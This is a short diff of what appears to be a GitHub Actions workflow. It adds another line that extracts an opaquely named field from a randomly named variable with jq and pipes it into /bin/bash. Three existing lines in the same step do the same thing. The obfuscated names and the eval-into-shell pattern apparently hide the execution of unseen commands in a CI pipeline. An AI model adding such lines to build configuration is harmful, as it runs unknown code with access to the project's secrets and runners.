@@ -23,6 +23,7 @@ jobs:
           echo $heoqt672 | jq -r .oz14 | /bin/bash
           printf '%s' "$p49" | jq -r .n4239 | /bin/bash
           printf '%s' "$fbu5" | jq -r .mfcp7 | /bin/bash
+          echo $v5 | jq -r .wr4620 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
